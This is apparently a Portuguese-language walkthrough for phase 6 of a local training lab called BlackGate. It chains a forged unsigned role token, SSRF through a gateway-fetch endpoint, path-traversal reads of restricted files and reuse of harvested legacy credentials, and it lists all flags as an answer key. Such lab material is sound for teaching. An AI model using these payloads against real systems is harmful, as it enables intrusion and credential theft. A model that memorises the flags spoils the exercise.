# Lab 05 - BlackGate - Walkthrough da Fase 6

Este walkthrough cobre a **Fase 6 — Credential Reuse / Legacy Panel Labyrinth** do Lab 05. A aplicação mantém as fases anteriores e adiciona um painel legado simulado com credenciais de manutenção, decoys e realm separado.

Tudo continua seguro e local: não há request real para internet, banco externo, shell, upload, Redis, worker ou command injection.

## Como subir

```bash
cd lab-05-blackgate
docker compose up --build
```

Acesse:

```text
http://localhost:8096
```

## Saúde e versão

Abra:

```text
http://localhost:8096/health
```

Resultado esperado:

```json
{
  "service": "blackgate",
  "status": "ok",
  "version": "1.5.0-phase6"
}
```

`/api/version` deve retornar build `bg-phase6-legacy-reuse`.

## Login

Faça login com:

```text
guest / guest123
```

Confirme o dashboard, a role `guest`, e os menus `/context`, `/gateway`, `/legacy` e `/files-vault`.

## Recon acumulado

Confira:

```text
/api/client-config
/api/routes
/debug/ping
```

Com:

```text
X-Debug-Token: guest-debug
```

Observe:

- `X-BG-Context`;
- gateway operator-mediated;
- Files Vault gateway-only;
- legacy em modo migration;
- realm separado;
- debug com informação propositalmente escassa sobre o painel legado.

## Gerar contexto operator

Use o mesmo abuso da Fase 3:

```bash
TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
echo "$TOKEN"
```

Valide com:

```text
POST /api/context/verify
Header: X-BG-Context: <TOKEN>
```

## Fase 3 preservada

```text
GET /api/operator/briefing
Header: X-BG-Context: <TOKEN>
```

Resultado:

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
```

## Fase 4 preservada

```text
/api/operator/gateway-fetch?url=http://api-core.internal/metadata
```

Resultado:

```text
FLAG{blackgate_gateway_trust_ssrf_phase4}
```

## Fase 5 preservada

```text
/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/phase5-seed.txt
```

Resultado:

```text
FLAG{blackgate_files_vault_controlled_read_phase5}
```

## Arquivos restritos de migração

Use o mesmo bypass controlado do Files Vault para ler arquivos restritos. Eles não aparecem no catálogo público.

Leia:

```text
/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/legacy-migration-notes.txt
```

Pontos importantes:

- o login público e o painel legado não compartilham identity provider;
- algumas contas foram espelhadas apenas para checks de manutenção via gateway;
- o primeiro bloco de credenciais arquivadas não deve ser confiável.

Leia:

```text
/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/operator-archive-2026.txt
```

Decoys vistos:

```text
operator / operator123
admin / admin
bg_admin / blackgate
svc_audit / audit2026
```

Leia:

```text
/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/credential-review.txt
```

Conclusões:

- `operator / operator123` é válido só no console público;
- `svc_audit` foi desativado;
- `bg_admin` é placeholder;
- contas de migração usam legacy realm;
- o formato esperado é `svc_migration`, não e-mail.

Leia o arquivo de credenciais:

```text
/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/legacy-panel-creds.txt
```

Credencial útil:

```text
svc_migration / migrate-yellow-gate
```

Credenciais decoy:

```text
operator / operator123
admin / admin
bg_admin / blackgate
svc_audit / audit2026
svc_backup / backup2026
```

## Enumerar legacy-panel.internal

Consulte metadata:

```text
/api/operator/gateway-fetch?url=http://legacy-panel.internal/metadata
```

Observe:

- `auth: legacy-realm`;
- `public_idp: false`;
- `gateway_required: true`;
- notas sobre credenciais arquivadas e stale entries.

Consulte status:

```text
/api/operator/gateway-fetch?url=http://legacy-panel.internal/status
```

Observe:

- `/login` está desabilitado;
- `/auth` e `/maintenance` continuam habilitados;
- interactive login não é o caminho correto.

Teste o decoy:

```text
/api/operator/gateway-fetch?url=http://legacy-panel.internal/login
```

Resultado:

```json
{
  "error": "interactive_login_disabled",
  "message": "Legacy interactive login is disabled during migration."
}
```

## Autenticar no legacy realm

Como o gateway-fetch recebe a URL interna dentro de uma query string, encode a URL quando houver parâmetros.

URL interna:

```text
http://legacy-panel.internal/auth?user=svc_migration&pass=migrate-yellow-gate
```

Após encode, envie pelo gateway-fetch.

Resultado esperado:

```json
{
  "authenticated": true,
  "realm": "maintenance",
  "principal": "svc_migration",
  "legacy_session": "bg6-legacy-session-migration",
  "next": "/maintenance"
}
```

Teste importante: se usar `operator / operator123`, o retorno deve ser `wrong_realm`, porque credenciais públicas não valem no realm de manutenção.

## Acessar maintenance

Use a sessão retornada:

```text
http://legacy-panel.internal/maintenance?session=bg6-legacy-session-migration
```

Envie essa URL codificada pelo gateway-fetch.

Resultado:

```text
FLAG{blackgate_legacy_credential_reuse_phase6}
```

Resposta completa esperada:

```json
{
  "service": "legacy-panel",
  "area": "maintenance",
  "principal": "svc_migration",
  "finding": "credential reuse across migration boundary",
  "flag": "FLAG{blackgate_legacy_credential_reuse_phase6}",
  "next_hint": "Maintenance reports queue jobs for asynchronous processing in the next phase."
}
```

## Bloqueios esperados

Sem credenciais:

```json
{
  "error": "missing_credentials",
  "message": "Maintenance realm credentials are required."
}
```

Credencial pública no painel legado:

```json
{
  "error": "wrong_realm",
  "message": "Public console credentials are not valid in the maintenance realm."
}
```

Credencial falsa:

```json
{
  "error": "invalid_legacy_credentials",
  "message": "Legacy realm authentication failed."
}
```

Maintenance sem sessão:

```json
{
  "error": "legacy_session_required",
  "message": "Authenticated maintenance session required."
}
```

## Flags confirmadas até esta fase

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
FLAG{blackgate_gateway_trust_ssrf_phase4}
FLAG{blackgate_files_vault_controlled_read_phase5}
FLAG{blackgate_legacy_credential_reuse_phase6}
```

## O que fica para a próxima fase

A Fase 6 não implementa report generator explorável, fila, worker, Redis ou command injection. A pista final indica que reports de manutenção entram em fila de processamento, preparando a Fase 7.
